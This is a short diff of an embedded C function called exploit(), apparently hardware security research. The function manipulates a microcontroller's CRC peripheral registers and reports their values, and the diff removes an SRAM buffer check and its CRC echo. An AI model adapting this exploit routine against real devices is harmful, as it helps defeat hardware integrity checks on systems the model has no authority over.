@@ -19,7 +19,6 @@ void exploit(void) {
   uint32_t final_sw;
   uint32_t live_dcra;
   uint32_t final_dcra;
-  uint32_t staged_crc;
 
   __asm__ volatile ("di");
   runtime_begin(&guard);
@@ -32,11 +31,6 @@ void exploit(void) {
   if (MMIO32(MAGIC0_ADDRESS) != MAGIC_WORD || MMIO32(MAGIC1_ADDRESS) != MAGIC_WORD) {
     halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 3u, 1u, &guard);
   }
-  if (MMIO32((uint32_t)SRAM_BUFFER + CRC_ADJUST - CRC_SECTOR_BASE) != CRC_CANDIDATE_ADJUST
-      || MMIO32((uint32_t)SRAM_BUFFER + CRC_MAGIC_OFFSET) != MAGIC_WORD) {
-    halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 4u, 1u, &guard);
-  }
-
   capture_dcra(&entry_ctl, &entry_cout);
   if ((entry_ctl & 3u) != 0u) {
     halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 6u, entry_ctl, &guard);
@@ -50,8 +44,6 @@ void exploit(void) {
   if (restore_dcra(entry_ctl, entry_cout) != 0u) {
     halt_crc_error(PROTO_OP_CRC_INTERMEDIATE, 7u, entry_ctl, &guard);
   }
-  staged_crc = crc_region(SRAM_BUFFER, TARGET_LENGTH, &guard);
-
   if (new_adjust != CRC_CANDIDATE_ADJUST || live_sw != live_dcra
       || live_sw == 0xFFFFFFFFu || final_sw != 0xFFFFFFFFu
       || final_dcra != 0xFFFFFFFFu) {
@@ -72,8 +64,8 @@ void exploit(void) {
   values[PROTO_CRC_PATCHED_DCRA_RAW] = final_dcra;
   values[PROTO_CRC_EXIT_CTL] = DCRA_CTL;
   values[PROTO_CRC_EXIT_COUT] = DCRA_COUT;
-  values[PROTO_CRC_SRAM_ECHO_LENGTH] = TARGET_LENGTH;
-  values[PROTO_CRC_SRAM_ECHO_CRC32] = staged_crc;
+  values[PROTO_CRC_SRAM_ECHO_LENGTH] = 0u;
+  values[PROTO_CRC_SRAM_ECHO_CRC32] = 0u;
 
   (void)send_crc_stream(PROTO_OP_CRC_INTERMEDIATE, values, &guard);
   runtime_end(&guard);
